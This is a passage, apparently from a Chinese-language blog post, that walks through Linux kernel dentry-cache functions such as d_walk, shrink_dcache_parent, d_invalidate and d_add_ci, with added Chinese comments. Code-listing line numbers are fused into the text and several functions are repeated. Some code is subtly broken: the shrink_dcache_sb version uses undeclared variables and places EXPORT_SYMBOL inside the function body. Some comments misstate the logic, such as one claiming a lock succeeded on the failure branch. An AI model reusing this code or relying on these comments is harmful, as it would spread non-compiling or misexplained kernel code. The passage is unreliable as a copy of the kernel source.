标志的代码。这些函数保证只在正确从主列表中隔离后，仅与提供的堆栈列表进行操作。 * 因此，它始终是局部访问。 */ return LRU_ROTATE; &#125; // 将dentry移动到可释放列表中 d_lru_shrink_move(lru, dentry, freeable); spin_unlock(&amp;dentry-&gt;d_lock); return LRU_REMOVED;&#125; 12345678910111213141516171819202122232425262728293031323334353637/** * prune_dcache_sb - 收缩dcache * @sb: 超级块 * @sc: 收缩控制参数，传递给list_lru_shrink_walk() * * 尝试通过@sc-&gt;nr_to_scan个条目来收缩超级块dcache的LRU。当我们需要更多内存时， * 从超级块收缩器函数调用此函数。 * * 如果所有的dentry都在使用中，此函数可能无法释放任何资源。 */long prune_dcache_sb(struct super_block *sb, struct shrink_control *sc)&#123; LIST_HEAD(dispose); long freed; freed = list_lru_shrink_walk(&amp;sb-&gt;s_dentry_lru, sc, dentry_lru_isolate, &amp;dispose); shrink_dentry_list(&amp;dispose); return freed;&#125;static enum lru_status dentry_lru_isolate_shrink(struct list_head *item, struct list_lru_one *lru, spinlock_t *lru_lock, void *arg)&#123; struct list_head *freeable = arg; struct dentry *dentry = container_of(item, struct dentry, d_lru); // 尝试获取dentry的锁，如果获取失败则跳过 if (!spin_trylock(&amp;dentry-&gt;d_lock)) return LRU_SKIP; // 将dentry移动到可释放列表中 d_lru_shrink_move(lru, dentry, freeable); spin_unlock(&amp;dentry-&gt;d_lock); return LRU_REMOVED;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041/** * prune_dcache_sb - 收缩dcache * @sb: 超级块 * @sc: 收缩控制参数，传递给list_lru_shrink_walk() * * 尝试通过@sc-&gt;nr_to_scan个条目来收缩超级块dcache的LRU。当我们需要更多内存时， * 从超级块收缩器函数调用此函数。 * * 如果所有的dentry都在使用中，此函数可能无法释放任何资源。 */long prune_dcache_sb(struct super_block *sb, struct shrink_control *sc)&#123; // 创建一个链表头用于存储待释放的dentry LIST_HEAD(dispose); long freed; // 调用list_lru_shrink_walk函数来遍历超级块的dentry LRU列表，并将满足条件的dentry添加到dispose链表中 freed = list_lru_shrink_walk(&amp;sb-&gt;s_dentry_lru, sc, dentry_lru_isolate, &amp;dispose); // 调用shrink_dentry_list函数来释放dispose链表中的dentry资源 shrink_dentry_list(&amp;dispose); return freed;&#125;static enum lru_status dentry_lru_isolate_shrink(struct list_head *item, struct list_lru_one *lru, spinlock_t *lru_lock, void *arg)&#123; // 将传入的参数转换为对应的类型 struct list_head *freeable = arg; struct dentry *dentry = container_of(item, struct dentry, d_lru); // 尝试获取dentry的锁，如果获取失败则跳过 if (!spin_trylock(&amp;dentry-&gt;d_lock)) return LRU_SKIP; // 将dentry移动到可释放列表中 d_lru_shrink_move(lru, dentry, freeable); spin_unlock(&amp;dentry-&gt;d_lock); return LRU_REMOVED;&#125; 1234567891011121314151617181920212223242526/** * shrink_dcache_sb - 收缩指定超级块的dcache * @sb: 超级块 * * 收缩指定超级块的dcache。在卸载文件系统之前，用于释放dcache。 */void shrink_dcache_sb(struct super_block *sb)&#123; // 循环执行，直到满足退出条件 do &#123; LIST_HEAD(dispose); // 检查超级块的dentry LRU列表是否还有剩余的dentry if (list_lru_count(&amp;sb-&gt;s_dentry_lru) &gt; 0) &#123; // 调用list_lru_shrink_walk函数来收缩超级块的dcache // 将满足条件的dentry添加到dispose链表中 freed = list_lru_shrink_walk(&amp;sb-&gt;s_dentry_lru, sc, dentry_lru_isolate, &amp;dispose); // 调用shrink_dentry_list函数来释放dispose链表中的dentry资源 shrink_dentry_list(&amp;dispose); &#125; &#125; while (list_lru_count(&amp;sb-&gt;s_dentry_lru) &gt; 0); // 导出shrink_dcache_sb函数的符号 EXPORT_SYMBOL(shrink_dcache_sb);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141/** * enum d_walk_ret - 树遍历期间的操作 * @D_WALK_CONTINUE: 继续遍历 * @D_WALK_QUIT: 终止遍历 * @D_WALK_NORETRY: 需要重试时终止遍历 * @D_WALK_SKIP: 跳过当前dentry及其子节点 */enum d_walk_ret &#123; D_WALK_CONTINUE, D_WALK_QUIT, D_WALK_NORETRY, D_WALK_SKIP,&#125;;/** * d_walk - 遍历dentry树 * @parent: 遍历的起始dentry * @data: 传递给enter()和finish()的数据 * @enter: 进入dentry时的回调函数 * * 在调用enter()回调函数时，会持有d_lock锁。 */static void d_walk(struct dentry *parent, void *data, enum d_walk_ret (*enter)(void *, struct dentry *))&#123; struct dentry *this_parent; struct list_head *next; unsigned seq = 0; enum d_walk_ret ret; bool retry = true;again: read_seqbegin_or_lock(&amp;rename_lock, &amp;seq); this_parent = parent; spin_lock(&amp;this_parent-&gt;d_lock); ret = enter(data, this_parent); switch (ret) &#123; case D_WALK_CONTINUE: break; case D_WALK_QUIT: case D_WALK_SKIP: goto out_unlock; case D_WALK_NORETRY: retry = false; break; &#125;repeat: next = this_parent-&gt;d_subdirs.next;resume: while (next != &amp;this_parent-&gt;d_subdirs) &#123; struct list_head *tmp = next; struct dentry *dentry = list_entry(tmp, struct dentry, d_child); next = tmp-&gt;next; if (unlikely(dentry-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR)) continue; spin_lock_nested(&amp;dentry-&gt;d_lock, DENTRY_D_LOCK_NESTED); ret = enter(data, dentry); switch (ret) &#123; case D_WALK_CONTINUE: break; case D_WALK_QUIT: spin_unlock(&amp;dentry-&gt;d_lock); goto out_unlock; case D_WALK_NORETRY: retry = false; break; case D_WALK_SKIP: spin_unlock(&amp;dentry-&gt;d_lock); continue; &#125; if (!list_empty(&amp;dentry-&gt;d_subdirs)) &#123; spin_unlock(&amp;this_parent-&gt;d_lock); spin_release(&amp;dentry-&gt;d_lock.dep_map, _RET_IP_); this_parent = dentry; spin_acquire(&amp;this_parent-&gt;d_lock.dep_map, 0, 1, _RET_IP_); goto repeat; &#125; spin_unlock(&amp;dentry-&gt;d_lock); &#125; /* * 当前层级遍历完成，向上回溯并继续搜索。 */ rcu_read_lock();ascend: if (this_parent != parent) &#123; struct dentry *child = this_parent; this_parent = child-&gt;d_parent; spin_unlock(&amp;child-&gt;d_lock); spin_lock(&amp;this_parent-&gt;d_lock); /* * 如果存在重命名操作，可能会回到错误的父节点。 */ if (need_seqretry(&amp;rename_lock, seq)) goto rename_retry; /* * 进入下一个仍然存在的兄弟节点。 */ do &#123; next = child-&gt;d_child.next; if (next == &amp;this_parent-&gt;d_subdirs) goto ascend; child = list_entry(next, struct dentry, d_child); &#125; while (unlikely(child-&gt;d_flags &amp; DCACHE_DENTRY_KILLED)); rcu_read_unlock(); goto resume; &#125; if (need_seqretry(&amp;rename_lock, seq)) goto rename_retry; rcu_read_unlock();out_unlock: spin_unlock(&amp;this_parent-&gt;d_lock); done_seqretry(&amp;rename_lock, seq); return;rename_retry: spin_unlock(&amp;this_parent-&gt;d_lock); rcu_read_unlock(); BUG_ON(seq &amp; 1); if (!retry) return; seq = 1; goto again;&#125; 1234567891011121314151617181920struct check_mount &#123; struct vfsmount *mnt; // 文件系统挂载点的指针 unsigned int mounted; // 表示文件系统是否已挂载的标志位&#125;;static enum d_walk_ret path_check_mount(void *data, struct dentry *dentry)&#123; struct check_mount *info = data; // 将传入的data参数转换为check_mount结构体指针 struct path path = &#123; .mnt = info-&gt;mnt, .dentry = dentry &#125;; // 创建path结构体，表示文件路径 if (likely(!d_mountpoint(dentry))) // 检查给定的dentry是否为挂载点 return D_WALK_CONTINUE; // 如果不是挂载点，则继续遍历 if (__path_is_mountpoint(&amp;path)) &#123; // 检查给定的路径是否为挂载点 info-&gt;mounted = 1; // 如果是挂载点，则将mounted标志位设置为1 return D_WALK_QUIT; // 并停止遍历 &#125; return D_WALK_CONTINUE; // 如果不是挂载点，则继续遍历&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * path_has_submounts - 检查当前命名空间中的父路径或其子目录是否包含挂载点。 * @parent: 要检查的路径。 * * 如果父路径或其子目录中包含当前命名空间中的挂载点，则返回true。 */int path_has_submounts(const struct path *parent)&#123; struct check_mount data = &#123; .mnt = parent-&gt;mnt, .mounted = 0 &#125;; read_seqlock_excl(&amp;mount_lock); // 获取mount_lock的读取锁 d_walk(parent-&gt;dentry, &amp;data, path_check_mount); // 遍历父路径的dentry，并检查是否包含挂载点 read_sequnlock_excl(&amp;mount_lock); // 释放mount_lock的读取锁 return data.mounted; // 返回是否存在挂载点的标志位&#125;EXPORT_SYMBOL(path_has_submounts); // 导出path_has_submounts符号，使其可在其他模块中使用/* * Called by mount code to set a mountpoint and check if the mountpoint is * reachable (e.g. NFS can unhash a directory dentry and then the complete * subtree can become unreachable). * * Only one of d_invalidate() and d_set_mounted() must succeed. For * this reason take rename_lock and d_lock on dentry and ancestors. */int d_set_mounted(struct dentry *dentry)&#123; struct dentry *p; int ret = -ENOENT; write_seqlock(&amp;rename_lock); // 获取rename_lock的写入锁 for (p = dentry-&gt;d_parent; !IS_ROOT(p); p = p-&gt;d_parent) &#123; /* Need exclusion wrt. d_invalidate() */ spin_lock(&amp;p-&gt;d_lock); // 获取父dentry的自旋锁 if (unlikely(d_unhashed(p))) &#123; // 检查父dentry是否未哈希 spin_unlock(&amp;p-&gt;d_lock); // 如果未哈希，则释放自旋锁 goto out; // 跳转到out标签处 &#125; spin_unlock(&amp;p-&gt;d_lock); // 释放父dentry的自旋锁 &#125; spin_lock(&amp;dentry-&gt;d_lock); // 获取当前dentry的自旋锁 if (!d_unlinked(dentry)) &#123; ret = -EBUSY; if (!d_mountpoint(dentry)) &#123; // 检查当前dentry是否为挂载点 dentry-&gt;d_flags |= DCACHE_MOUNTED; // 设置当前dentry的挂载标志位 ret = 0; &#125; &#125; spin_unlock(&amp;dentry-&gt;d_lock); // 释放当前dentry的自旋锁out: write_sequnlock(&amp;rename_lock); // 释放rename_lock的写入锁 return ret; // 返回操作结果&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Search the dentry child list of the specified parent, * and move any unused dentries to the end of the unused * list for prune_dcache(). We descend to the next level * whenever the d_subdirs list is non-empty and continue * searching. * * It returns zero iff there are no unused children, * otherwise it returns the number of children moved to * the end of the unused list. This may not be the total * number of unused children, because select_parent can * drop the lock and return early due to latency * constraints. */struct select_data &#123; struct dentry *start; // 起始dentry union &#123; long found; // 找到的未使用的dentry数量 struct dentry *victim; // 待处理的dentry &#125;; struct list_head dispose; // 待处理的dentry链表&#125;;static enum d_walk_ret select_collect(void *_data, struct dentry *dentry)&#123; struct select_data *data = _data; enum d_walk_ret ret = D_WALK_CONTINUE; if (data-&gt;start == dentry) goto out; if (dentry-&gt;d_flags &amp; DCACHE_SHRINK_LIST) &#123; // 检查dentry是否在收缩列表中 data-&gt;found++; // 增加找到的未使用的dentry数量 &#125; else &#123; if (dentry-&gt;d_flags &amp; DCACHE_LRU_LIST) d_lru_del(dentry); // 从LRU列表中删除dentry if (!dentry-&gt;d_lockref.count) &#123; // 检查dentry的锁引用计数是否为0 d_shrink_add(dentry, &amp;data-&gt;dispose); // 将dentry添加到待处理链表中 data-&gt;found++; // 增加找到的未使用的dentry数量 &#125; &#125; /* * 如果我们找到了一些未使用的dentry，我们可以返回给调用者（这确保了前进）。 * 我们将会回来找到剩下的。 */ if (!list_empty(&amp;data-&gt;dispose)) ret = need_resched() ? D_WALK_QUIT : D_WALK_NORETRY;out: return ret;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243static enum d_walk_ret select_collect2(void *_data, struct dentry *dentry)&#123; // 定义一个指向 select_data 结构体的指针，并将 _data 强制转换为 select_data 类型 struct select_data *data = _data; // 定义一个枚举类型的变量 ret，并初始化为 D_WALK_CONTINUE enum d_walk_ret ret = D_WALK_CONTINUE; // 如果 data-&gt;start 等于当前遍历到的 dentry，则跳转到 out 标签处 if (data-&gt;start == dentry) goto out; // 如果 dentry 的 d_flags 中包含 DCACHE_SHRINK_LIST 标志位 if (dentry-&gt;d_flags &amp; DCACHE_SHRINK_LIST) &#123; // 如果 dentry 的 d_lockref.count 为 0 if (!dentry-&gt;d_lockref.count) &#123; // 获取 RCU 读锁 rcu_read_lock(); // 将当前的 dentry 赋值给 data-&gt;victim data-&gt;victim = dentry; // 返回 D_WALK_QUIT，表示遍历结束 return D_WALK_QUIT; &#125; &#125; else &#123; // 如果 dentry 的 d_flags 中包含 DCACHE_LRU_LIST 标志位 if (dentry-&gt;d_flags &amp; DCACHE_LRU_LIST) // 从 LRU 列表中删除当前的 dentry d_lru_del(dentry); // 如果 dentry 的 d_lockref.count 为 0 if (!dentry-&gt;d_lockref.count) // 将当前的 dentry 添加到 dispose 列表中 d_shrink_add(dentry, &amp;data-&gt;dispose); &#125; /* * 如果 dispose 列表不为空，则设置 ret 为 D_WALK_NORETRY， * 如果需要调度，则设置 ret 为 D_WALK_QUIT，以确保向调用者返回。 * 我们将会继续遍历剩余的 dentry。 */ if (!list_empty(&amp;data-&gt;dispose)) ret = need_resched() ? D_WALK_QUIT : D_WALK_NORETRY;out: // 返回 ret return ret;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/** * shrink_dcache_parent - prune dcache * @parent: parent of entries to prune * * Prune the dcache to remove unused children of the parent dentry. */void shrink_dcache_parent(struct dentry *parent)&#123; // 无限循环 for (;;) &#123; // 定义一个 select_data 结构体，并初始化 start 字段为 parent struct select_data data = &#123;.start = parent&#125;; // 初始化 dispose 列表的头节点 INIT_LIST_HEAD(&amp;data.dispose); // 遍历 parent 的子节点，并将不需要的子节点添加到 dispose 列表中 d_walk(parent, &amp;data, select_collect); // 如果 dispose 列表不为空，则释放 dispose 列表中的 dentry，并继续下一轮循环 if (!list_empty(&amp;data.dispose)) &#123; shrink_dentry_list(&amp;data.dispose); continue; &#125; // 调度当前进程，以便其他任务有机会执行 cond_resched(); // 如果没有找到需要释放的子节点，则跳出循环 if (!data.found) break; // 将 victim 字段置为空 data.victim = NULL; // 再次遍历 parent 的子节点，并将不需要的子节点添加到 dispose 列表中 d_walk(parent, &amp;data, select_collect2); // 如果找到了需要释放的子节点 if (data.victim) &#123; struct dentry *parent; // 获取 victim 的 d_lock 自旋锁 spin_lock(&amp;data.victim-&gt;d_lock); // 如果成功获取到了 shrink_lock_dentry 锁 if (!shrink_lock_dentry(data.victim)) &#123; // 释放 victim 的 d_lock 自旋锁，并解锁 RCU 读锁 spin_unlock(&amp;data.victim-&gt;d_lock); rcu_read_unlock(); &#125; else &#123; // 解锁 RCU 读锁 rcu_read_unlock(); // 获取 victim 的父节点 parent = data.victim-&gt;d_parent; // 如果 parent 不是 victim 本身，则将 parent 添加到 dispose 列表中 if (parent != data.victim) __dput_to_list(parent, &amp;data.dispose); // 释放 victim 的资源 __dentry_kill(data.victim); &#125; &#125; // 如果 dispose 列表不为空，则释放 dispose 列表中的 dentry if (!list_empty(&amp;data.dispose)) shrink_dentry_list(&amp;data.dispose); &#125;&#125;EXPORT_SYMBOL(shrink_dcache_parent); 123456789101112131415161718192021222324static enum d_walk_ret umount_check(void *_data, struct dentry *dentry)&#123; /* 如果存在繁忙的子目录，则忽略当前的 dentry */ if (!list_empty(&amp;dentry-&gt;d_subdirs)) return D_WALK_CONTINUE; /* 如果是根目录且引用计数为1，则忽略当前的 dentry */ if (dentry == _data &amp;&amp; dentry-&gt;d_lockref.count == 1) return D_WALK_CONTINUE; /* 打印错误信息，指示当前的 dentry 仍在使用中 */ printk(KERN_ERR &quot;BUG: Dentry %p&#123;i=%lx,n=%pd&#125; &quot; &quot; still in use (%d) [unmount of %s %s]\\n&quot;, dentry, dentry-&gt;d_inode ? dentry-&gt;d_inode-&gt;i_ino : 0UL, dentry, dentry-&gt;d_lockref.count, dentry-&gt;d_sb-&gt;s_type-&gt;name, dentry-&gt;d_sb-&gt;s_id); /* 触发警告，表示发现了一个错误 */ WARN_ON(1); return D_WALK_CONTINUE;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849static void do_one_tree(struct dentry *dentry)&#123; // 收缩 dcache，移除父目录 dentry 的未使用子节点 shrink_dcache_parent(dentry); // 遍历 dentry 的子节点，并检查是否有仍在使用的 dentry d_walk(dentry, dentry, umount_check); // 丢弃 dentry 的引用计数 d_drop(dentry); // 释放 dentry dput(dentry);&#125;/* * 在卸载时销毁与超级块关联的 dentry */void shrink_dcache_for_umount(struct super_block *sb)&#123; struct dentry *dentry; // 检查 s_umount 是否已经被锁定 WARN(down_read_trylock(&amp;sb-&gt;s_umount), &quot;s_umount should&#x27;ve been locked&quot;); // 处理根目录的 dentry dentry = sb-&gt;s_root; sb-&gt;s_root = NULL; do_one_tree(dentry); // 处理 s_roots 链表中的所有 dentry while (!hlist_bl_empty(&amp;sb-&gt;s_roots)) &#123; dentry = dget(hlist_bl_entry(hlist_bl_first(&amp;sb-&gt;s_roots), struct dentry, d_hash)); do_one_tree(dentry); &#125;&#125;static enum d_walk_ret find_submount(void *_data, struct dentry *dentry)&#123; struct dentry **victim = _data; // 如果 dentry 是挂载点 if (d_mountpoint(dentry)) &#123; // 获取 dentry 的 d_lock 自旋锁 __dget_dlock(dentry); // 将 dentry 赋值给 victim *victim = dentry; // 返回 D_WALK_QUIT，表示遍历结束 return D_WALK_QUIT; &#125; // 返回 D_WALK_CONTINUE，继续遍历 return D_WALK_CONTINUE;&#125; 123456789101112131415161718192021222324252627282930/** * d_invalidate - 分离子挂载点，修剪 dcache，并丢弃 * @dentry: 需要使无效的 dentry（即分离、修剪和丢弃的 dentry） */void d_invalidate(struct dentry *dentry)&#123; bool had_submounts = true; // 是否存在子挂载点的标志 if (!dentry-&gt;d_inode) return; // 分离子挂载点并修剪 dcache shrink_dcache_parent(dentry); for (;;) &#123; struct dentry *victim = NULL; // 遍历 dentry 及其子节点，查找子挂载点 d_walk(dentry, &amp;victim, find_submount); if (!victim) &#123; // 如果没有找到子挂载点 if (had_submounts) &#123; // 如果之前存在子挂载点，则再次修剪 dcache shrink_dcache_parent(dentry); &#125; return; &#125; // 分离挂载点并丢弃 detach_mounts(victim); dput(victim); &#125;&#125;EXPORT_SYMBOL(d_invalidate); 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * 这段代码应该等同于 d_instantiate() + unlock_new_inode()， * 但在执行其他操作之前，先执行 unlock_new_inode() 中与 lockdep 相关的部分。 * 使用这个函数替代手动编写的 d_instantiate() 和 unlock_new_inode() 的组合。 */void d_instantiate_new(struct dentry *entry, struct inode *inode)&#123; // 检查 entry 是否已经在别的哈希表中 BUG_ON(!hlist_unhashed(&amp;entry-&gt;d_u.d_alias)); // 检查 inode 是否为空 BUG_ON(!inode); // 为 inode 的互斥锁添加 lockdep 注解 lockdep_annotate_inode_mutex_key(inode); // 调用安全模块的 d_instantiate() 函数 security_d_instantiate(entry, inode); // 获取 inode 的自旋锁 spin_lock(&amp;inode-&gt;i_lock); // 调用内部函数 __d_instantiate() 来实例化 dentry 和 inode __d_instantiate(entry, inode); // 检查 inode 的状态是否为 I_NEW WARN_ON(!(inode-&gt;i_state &amp; I_NEW)); // 清除 inode 的状态标志 I_NEW 和 I_CREATING inode-&gt;i_state &amp;= ~I_NEW &amp; ~I_CREATING; // 确保在修改 inode 状态后的内存屏障 smp_mb(); // 唤醒等待 inode 状态变为 __I_NEW 的进程 wake_up_bit(&amp;inode-&gt;i_state, __I_NEW); // 释放 inode 的自旋锁 spin_unlock(&amp;inode-&gt;i_lock);&#125;// 导出 d_instantiate_new() 函数供其他模块使用EXPORT_SYMBOL(d_instantiate_new); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283struct dentry *d_make_root(struct inode *root_inode)&#123; struct dentry *res = NULL; // 如果 root_inode 不为空 if (root_inode) &#123; // 为 root_inode 分配一个匿名的 dentry res = d_alloc_anon(root_inode-&gt;i_sb); if (res) &#123; // 将 root_inode 和 dentry 关联起来 d_instantiate(res, root_inode); &#125; else &#123; // 如果无法分配 dentry，则释放 root_inode iput(root_inode); &#125; &#125; return res;&#125;EXPORT_SYMBOL(d_make_root);static struct dentry *__d_instantiate_anon(struct dentry *dentry, struct inode *inode, bool disconnected)&#123; struct dentry *res; unsigned add_flags; // 调用安全模块的 d_instantiate() 函数 security_d_instantiate(dentry, inode); // 获取 inode 的自旋锁 spin_lock(&amp;inode-&gt;i_lock); // 检查是否已经存在与 inode 关联的 dentry res = __d_find_any_alias(inode); if (res) &#123; // 如果已经存在，则释放当前的 dentry，并返回已存在的 dentry spin_unlock(&amp;inode-&gt;i_lock); dput(dentry); goto out_iput; &#125; // 为 inode 设置标志位 add_flags = d_flags_for_inode(inode); // 如果是断开的 dentry，则设置 DCACHE_DISCONNECTED 标志位 if (disconnected) add_flags |= DCACHE_DISCONNECTED; // 获取 dentry 的自旋锁 spin_lock(&amp;dentry-&gt;d_lock); // 将 inode 和类型信息设置到 dentry 中 __d_set_inode_and_type(dentry, inode, add_flags); // 将 dentry 添加到 inode 的别名链表中 hlist_add_head(&amp;dentry-&gt;d_u.d_alias, &amp;inode-&gt;i_dentry); // 如果不是断开的 dentry，则将 dentry 添加到超级块的根目录链表中 if (!disconnected) &#123; hlist_bl_lock(&amp;dentry-&gt;d_sb-&gt;s_roots); hlist_bl_add_head(&amp;dentry-&gt;d_hash, &amp;dentry-&gt;d_sb-&gt;s_roots); hlist_bl_unlock(&amp;dentry-&gt;d_sb-&gt;s_roots); &#125; // 释放 dentry 的自旋锁和 inode 的自旋锁 spin_unlock(&amp;dentry-&gt;d_lock); spin_unlock(&amp;inode-&gt;i_lock); return dentry;out_iput: // 释放 inode iput(inode); return res;&#125;struct dentry *d_instantiate_anon(struct dentry *dentry, struct inode *inode)&#123; // 调用内部函数 __d_instantiate_anon() 来实例化匿名的 dentry 和 inode return __d_instantiate_anon(dentry, inode, true);&#125;EXPORT_SYMBOL(d_instantiate_anon); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677static struct dentry *__d_obtain_alias(struct inode *inode, bool disconnected)&#123; struct dentry *tmp; struct dentry *res; // 如果 inode 为空，则返回错误码 -ESTALE if (!inode) return ERR_PTR(-ESTALE); // 如果 inode 是一个错误指针，则将其转换为错误类型并返回 if (IS_ERR(inode)) return ERR_CAST(inode); // 查找与 inode 关联的任意别名的 dentry res = d_find_any_alias(inode); if (res) goto out_iput; // 为 inode 分配一个匿名的 dentry tmp = d_alloc_anon(inode-&gt;i_sb); if (!tmp) &#123; // 如果无法分配 dentry，则返回错误码 -ENOMEM res = ERR_PTR(-ENOMEM); goto out_iput; &#125; // 调用内部函数 __d_instantiate_anon() 来实例化匿名的 dentry 和 inode return __d_instantiate_anon(tmp, inode, disconnected);out_iput: // 释放 inode iput(inode); return res;&#125;/** * d_obtain_alias - find or allocate a DISCONNECTED dentry for a given inode * @inode: inode to allocate the dentry for * * 获取给定 inode 的一个 dentry，用于 NFS 文件句柄转换或类似的通过句柄打开操作。 * 返回的 dentry 可能是匿名的，也可能具有完整的名称（如果 inode 已经在缓存中）。 * * 当在目录 inode 上调用时，我们必须确保 inode 只有一个 dentry。 * 如果找到了一个 dentry，则返回该 dentry 而不是分配一个新的。 * * 在成功返回时，inode 的引用已经转移到了 dentry 上。 * 在出现错误的情况下，释放了 inode 的引用。 * 为了在导出操作中更容易使用，可以传入一个 %NULL 或 IS_ERR 的 inode， * 错误将传播到返回值，将 %NULL 的 inode 替换为 ERR_PTR(-ESTALE)。 */struct dentry *d_obtain_alias(struct inode *inode)&#123; // 调用内部函数 __d_obtain_alias() 来获取一个 DISCONNECTED 的 dentry return __d_obtain_alias(inode, true);&#125;EXPORT_SYMBOL(d_obtain_alias);/** * d_obtain_root - find or allocate a dentry for a given inode * @inode: inode to allocate the dentry for * * 获取给定 inode 的一个 IS_ROOT dentry，用于文件系统的根目录。 * * 我们必须确保目录 inode 只有一个 dentry。 * 如果找到了一个 dentry，则返回该 dentry 而不是分配一个新的。 * * 在成功返回时，inode 的引用已经转移到了 dentry 上。 * 在出现错误的情况下，释放了 inode 的引用。 * 可以传入一个 %NULL 或 IS_ERR 的 inode，并将错误传播到返回值， * 将 %NULL 的 inode 替换为 ERR_PTR(-ESTALE)。 */struct dentry *d_obtain_root(struct inode *inode)&#123; // 调用内部函数 __d_obtain_alias() 来获取一个根目录的 dentry return __d_obtain_alias(inode, false);&#125;EXPORT_SYMBOL(d_obtain_root); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * d_add_ci - 查找或分配具有大小写精确名称的新的dentry * @inode: 已找到的不区分大小写的查找的inode * @dentry: 传递给父级查找函数的负面dentry * @name: 要与返回的dentry关联的大小写精确名称 * * 这是为了避免在dcache中填充具有不区分大小写的名称到相同的inode， * 只有实际的正确大小写存储在dcache中，用于不区分大小写的文件系统。 * * 对于不区分大小写的查找匹配，如果dcache中已经存在大小写精确的dentry， * 则使用它并返回它。 * * 如果不存在具有精确大小写名称的条目，则分配具有精确大小写的新的dentry，并返回拼接的条目。 */struct dentry *d_add_ci(struct dentry *dentry, struct inode *inode, struct qstr *name)&#123; struct dentry *found, *res; /* 首先检查是否已经存在与名称匹配的dentry，如果不存在，则立即创建它。 */ found = d_hash_and_lookup(dentry-&gt;d_parent, name); if (found) &#123; iput(inode); return found; &#125; if (d_in_lookup(dentry)) &#123; /* 如果dentry正在进行查找，则并行分配新的dentry */ found = d_alloc_parallel(dentry-&gt;d_parent, name, dentry-&gt;d_wait); if (IS_ERR(found) || !d_in_lookup(found)) &#123; iput(inode); return found; &#125; &#125; else &#123; /* 否则，分配新的dentry */ found = d_alloc(dentry-&gt;d_parent, name); if (!found) &#123; iput(inode); return ERR_PTR(-ENOMEM); &#125; &#125; /* 将inode与新的dentry进行关联 */ res = d_splice_alias(inode, found); if (res) &#123; d_lookup_done(found); dput(found); return res; &#125; return found;&#125;EXPORT_SYMBOL(d_add_ci); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * d_same_name - 比较dentry的名称与大小写精确名称 * @parent: 父级dentry * @dentry: 传递给父级查找函数的负面dentry * @name: 要与返回的dentry关联的大小写精确名称 * * 返回值：如果名称相同则返回true，否则返回false */bool d_same_name(const struct dentry *dentry, const struct dentry *parent, const struct qstr *name)&#123; if (likely(!(parent-&gt;d_flags &amp; DCACHE_OP_COMPARE))) &#123; /* 如果父级dentry没有DCACHE_OP_COMPARE标志，则直接比较名称 */ if (dentry-&gt;d_name.len != name-&gt;len) return false; return dentry_cmp(dentry, name-&gt;name, name-&gt;len) == 0; &#125; /* 否则，调用父级dentry的d_compare函数进行比较 */ return parent-&gt;d_op-&gt;d_compare(dentry, dentry-&gt;d_name.len, dentry-&gt;d_name.name, name) == 0;&#125;EXPORT_SYMBOL_GPL(d_same_name);/* * 当父级dentry具有DCACHE_OP_COMPARE标志时，这是__d_lookup_rcu()的实现，这会使事情变得更加复杂。 */static noinline struct dentry *__d_lookup_rcu_op_compare( const struct dentry *parent, const struct qstr *name, unsigned *seqp)&#123; u64 hashlen = name-&gt;hash_len; struct hlist_bl_head *b = d_hash(hashlen_hash(hashlen)); struct hlist_bl_node *node; struct dentry *dentry; hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; int tlen; const char *tname; unsigned seq; seqretry: seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); if (dentry-&gt;d_parent != parent) continue; if (d_unhashed(dentry)) continue; if (dentry-&gt;d_name.hash != hashlen_hash(hashlen)) continue; tlen = dentry-&gt;d_name.len; tname = dentry-&gt;d_name.name; /* 我们希望得到一对一致的（name,len） */ if (read_seqcount_retry(&amp;dentry-&gt;d_seq, seq)) &#123; cpu_relax(); goto seqretry; &#125; if (parent-&gt;d_op-&gt;d_compare(dentry, tlen, tname, name) != 0) continue; *seqp = seq; return dentry; &#125; return NULL;&#125; 123456789101112131415161718192021222324/** * d_same_name - 比较dentry的名称与大小写精确名称 * @parent: 父级dentry * @dentry: 传递给父级查找函数的负面dentry * @name: 要与返回的dentry关联的大小写精确名称 * * 返回值：如果名称相同则返回true，否则返回false */bool d_same_name(const struct dentry *dentry, const struct dentry *parent, const struct qstr *name)&#123; if (likely(!(parent-&gt;d_flags &amp; DCACHE_OP_COMPARE))) &#123; // 如果父级dentry没有DCACHE_OP_COMPARE标志，则直接比较名称 if (dentry-&gt;d_name.len != name-&gt;len) return false; return dentry_cmp(dentry, name-&gt;name, name-&gt;len) == 0; &#125; // 否则，调用父级dentry的d_compare函数进行比较 return parent-&gt;d_op-&gt;d_compare(dentry, dentry-&gt;d_name.len, dentry-&gt;d_name.name, name) == 0;&#125;EXPORT_SYMBOL_GPL(d_same_name); 1234567891011121314151617181920212223242526272829303132333435363738394041/* * 当父级dentry具有DCACHE_OP_COMPARE标志时，这是__d_lookup_rcu()的实现，这会使事情变得更加复杂。 */static noinline struct dentry *__d_lookup_rcu_op_compare( const struct dentry *parent, const struct qstr *name, unsigned *seqp)&#123; u64 hashlen = name-&gt;hash_len; // 获取name的哈希长度 struct hlist_bl_head *b = d_hash(hashlen_hash(hashlen)); // 获取哈希表的头指针 struct hlist_bl_node *node; struct dentry *dentry; // 遍历哈希表中的每个节点 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; int tlen; const char *tname; unsigned seq; seqretry: seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); // 开始读取序列计数器 if (dentry-&gt;d_parent != parent) // 如果dentry的父级不是指定的parent continue; // 继续下一个节点 if (d_unhashed(dentry)) // 如果dentry未哈希 continue; // 继续下一个节点 if (dentry-&gt;d_name.hash != hashlen_hash(hashlen)) // 